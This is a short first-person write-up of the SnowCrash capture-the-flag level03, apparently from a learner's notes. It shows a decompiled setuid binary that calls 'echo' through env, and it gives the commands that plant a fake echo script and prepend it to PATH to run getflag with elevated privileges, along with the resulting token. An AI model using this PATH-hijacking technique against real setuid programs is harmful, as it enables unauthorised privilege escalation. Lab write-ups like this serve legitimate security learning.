I used the "ls" command to list the files in the directory and found a program named "level03." When I used "cat" to view its contents, I realized it was in binary format. To gain a better understanding of how it works, I attempted to disassemble it using 'objdump -d level03,' which provided me with an assembly program. However, I found the assembly code difficult to comprehend.

I decided to look for a tool to assist me in understanding the program and came across Ghidra, which can translate assembly code into C. After running the code through Ghidra, I found the following "main" function in the program:

int main(int argc, char **argv, char **envp)
{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid, __rgid, __rgid);
  setresuid(__ruid, __ruid, __ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}

The line that caught my attention was: iVar1 = system("/usr/bin/env echo Exploit me");. It indicated that the program was calling the "echo" command, which reminded me of the Minishell project I worked on earlier. In Minishell, built-in commands were called using the 'PATH=' environment variable. This led me to believe that I might be able to manipulate the program to call "getflag" instead of "echo."

To achieve this, I created a small program using the following command: echo "/bin/sh -c 'getflag'" > /test/echo. Then, I exported the new PATH environment variable as follows: export PATH=/test:$PATH.
And it work ! 

/*********************************************************\

level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

\*********************************************************/


